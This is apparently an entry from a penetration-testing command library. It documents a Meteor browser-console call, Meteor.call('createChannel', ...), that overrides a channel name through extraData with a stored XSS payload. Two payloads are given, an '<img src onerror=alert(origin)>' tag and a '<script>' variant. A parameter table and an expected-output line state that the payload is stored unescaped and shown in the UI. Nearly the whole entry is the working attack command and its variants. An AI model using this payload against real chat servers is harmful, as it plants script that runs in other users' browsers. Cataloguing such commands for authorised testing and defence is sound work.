---
id: cmd-meteor-call-xss
data: >-
  Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me
  <img src onerror=alert(origin)>' })
tags:
  - xss
  - meteor
  - javascript
type: command
output: Channel created with payload in name property
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:18.925Z'
verified: false
validated: true
submitted: true
---
---

# meteor-call-create-channel-xss

## Command

```javascript
Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me <img src onerror=alert(origin)>' })
```

## Description

Executes a Meteor method call from the browser console to create a public channel, overriding the name with an XSS payload via extraData for storage in the database.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 'createChannel' | Method name | Yes |
| 'valid-name' | Initial channel name | Yes |
| [] | Empty members array | Yes |
| false | Not private | Yes |
| {} | Empty extraData object | Yes |
| { name: 'edit me <img src onerror=alert(origin)>' } | Override with XSS in name | Yes |

## Examples

### Basic Usage

```javascript
Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me <img src onerror=alert(origin)>' })
```

### Advanced Usage

```javascript
Meteor.call('createChannel', 'test', ['user1'], true, {type: 'p'}, { name: '<script>alert("xss")</script>' })
```

## Expected Output

Returns channel object with ID; channel appears in UI, payload stored unescaped in DB.

## Related

- [[procedures/Create-Channel-with-Stored-XSS-Payload]]

